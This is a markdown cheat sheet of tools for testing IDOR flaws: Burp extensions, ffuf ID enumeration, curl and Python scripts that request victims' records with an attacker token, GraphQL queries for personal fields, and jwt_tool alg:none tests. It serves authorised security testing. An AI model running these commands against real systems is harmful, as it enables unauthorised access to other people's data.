# Tools for IDOR Testing

## Burp Suite (Primary Tool)

### Useful Extensions (BApp Store)
- **Autorize** — Automatically replays every request with a low-privilege token and flags responses that differ from 403. Best IDOR automation tool available.
- **Auth Analyzer** — Similar to Autorize, supports multiple sessions simultaneously
- **Param Miner** — Discovers hidden parameters that may contain object references
- **Logger++** — Advanced request logging with filters

### Manual Burp Workflow
1. Proxy both accounts through Burp
2. Use Comparer to diff responses between "own object" and "victim object"
3. Use Intruder for numeric ID enumeration (Sniper mode, numeric payload)
4. Use Repeater to replay modified requests

## Command-Line Tools

### ffuf (Fuzzing)
```bash
# Enumerate numeric IDs
ffuf -w <(seq 1 10000) -u "https://target.com/api/users/FUZZ" \
  -H "Authorization: Bearer ATTACKER_TOKEN" \
  -fc 404,403 -mc all -o results.json

# Filter by response size to find valid vs invalid
ffuf -w ids.txt -u "https://target.com/api/orders/FUZZ" \
  -H "Cookie: session=ATTACKER_SESSION" \
  -fs 0,42   # filter out empty/error responses
```

### curl (Quick Manual Tests)
```bash
# Basic IDOR test
curl -s "https://target.com/api/users/VICTIM_ID/profile" \
  -H "Authorization: Bearer ATTACKER_TOKEN" | jq .

# Test without auth (unauthenticated access)
curl -s "https://target.com/api/users/1234/profile" | jq .

# Method switching
for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
  echo "=== $method ==="
  curl -s -X $method "https://target.com/api/users/1234" \
    -H "Authorization: Bearer ATTACKER_TOKEN" -o /dev/null -w "%{http_code}\n"
done
```

### Python (Custom Automation)
```python
import requests

victim_id = 1234
attacker_token = "Bearer eyJ..."
base_url = "https://target.com/api"

endpoints = [
    f"/users/{victim_id}",
    f"/users/{victim_id}/profile",
    f"/users/{victim_id}/documents",
    f"/orders?user_id={victim_id}",
]

for endpoint in endpoints:
    r = requests.get(
        base_url + endpoint,
        headers={"Authorization": attacker_token}
    )
    print(f"{r.status_code} | {len(r.text)} bytes | {endpoint}")
    if r.status_code == 200:
        print(f"  ⚠️  Possible IDOR: {r.text[:200]}")
```

## GraphQL-Specific

### graphql-cop
```bash
graphql-cop -t https://target.com/graphql -H "Authorization: Bearer TOKEN"
```

### Manual Introspection → ID Extraction
```bash
# Get schema
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | jq .

# Test object access
curl -s -X POST https://target.com/graphql \
  -H "Authorization: Bearer ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: \"VICTIM_ID\") { email phone address } }"}' | jq .
```

## JWT Manipulation

### jwt_tool
```bash
# Decode and inspect
python3 jwt_tool.py TOKEN

# Test alg:none bypass
python3 jwt_tool.py TOKEN -X a

# Tamper a claim
python3 jwt_tool.py TOKEN -T  # interactive tamper mode
```

### Manual (bash)
```bash
# Decode payload (no verification)
echo "PAYLOAD_PART" | base64 -d | jq .
```
